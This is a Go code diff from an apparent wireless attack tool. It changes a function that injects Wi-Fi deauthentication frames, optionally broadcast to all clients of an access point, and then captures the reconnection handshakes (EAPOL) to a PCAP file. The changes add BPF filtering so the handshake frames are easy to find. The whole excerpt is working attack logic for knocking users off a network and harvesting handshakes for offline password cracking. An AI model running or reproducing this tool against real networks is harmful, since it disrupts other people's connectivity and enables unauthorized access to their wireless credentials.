@@ -22,10 +22,7 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 		outPath = "handshake.pcap"
 	}
 
-	destLabel := deauthClient
-	if destLabel == "" || destLabel == "ff:ff:ff:ff:ff:ff" {
-		destLabel = "Broadcast (All Clients)"
-	}
+	destLabel := clientLabel(deauthClient)
 
 	// The UDP stream receiver must be bound before the burst so the very
 	// first probe requests after the deauth are captured.
@@ -43,18 +40,45 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 	defer receiver.Close()
 
 	fmt.Printf("[+] Writing PCAP dump to: %s\n", outPath)
+
+	// Narrow the capture before the burst so the PCAP stays small and the
+	// handshake frames are easy to find. The daemon's BSSID filter checks
+	// Addr1/Addr2/Addr3, so EAPOL data frames survive it.
+	filterApplied := false
+	if deauthFilterBSSID != "" || deauthMgmtOnly {
+		fmt.Printf("[+] Attaching kernel BPF filter (mgmt_only=%v, bssid=%s)...\n",
+			deauthMgmtOnly, deauthFilterBSSID)
+		if err := client.SetFilter(deauthMgmtOnly, deauthFilterBSSID); err != nil {
+			fmt.Printf("[!] Warning: failed to attach BPF filter: %v\n", err)
+		} else {
+			filterApplied = true
+		}
+	} else {
+		// Start from a known state: a filter left behind by an earlier
+		// session would silently narrow this capture.
+		if err := client.SetFilter(false, ""); err != nil {
+			fmt.Printf("[!] Warning: failed to clear inherited BPF filter: %v\n", err)
+		}
+		fmt.Printf("    Tip: add --filter-bssid %s to keep the PCAP small.\n", deauthBSSID)
+	}
+
 	fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
 	fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
 	fmt.Printf("    Client     : %s\n", destLabel)
 	fmt.Printf("    Channel    : %d\n", deauthChannel)
 
+	txBefore, txBeforeOK := readTxFrames(client)
 	sent, queued, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
 	if err != nil {
 		fmt.Printf("[!] Injection failed: %v\n", err)
+		if filterApplied {
+			_ = client.SetFilter(false, "")
+		}
 		os.Exit(1)
 	}
 
-	fmt.Printf("[+] Injection accepted. Transmitted: %d, Queued: %d, Failed: %d\n", sent, queued, failed)
+	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
+		queued, sent, failed)
 	if queued > 0 {
 		if err := waitForTxDrain(client, 5*time.Second); err != nil {
 			fmt.Printf("[!] Lost contact with the drone during TX: %v\n", err)
@@ -62,6 +86,7 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 			os.Exit(1)
 		}
 	}
+	reportTxDelta(client, txBefore, txBeforeOK, sent+queued)
 
 	fmt.Printf("\n[+] Deauth sent — listening on channel %d for reconnections and handshakes.\n", deauthChannel)
 	fmt.Println("    Press Ctrl+C to stop. Open the capture with:")
@@ -70,6 +95,11 @@ func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
 	waitForInterrupt()
 
 	fmt.Println("\n[*] Stopping capture session...")
+	if filterApplied {
+		if err := client.SetFilter(false, ""); err != nil {
+			fmt.Printf("[!] Warning: failed to clear BPF filter: %v\n", err)
+		}
+	}
 	if err := client.StopMonitor(); err != nil {
 		fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
 	}
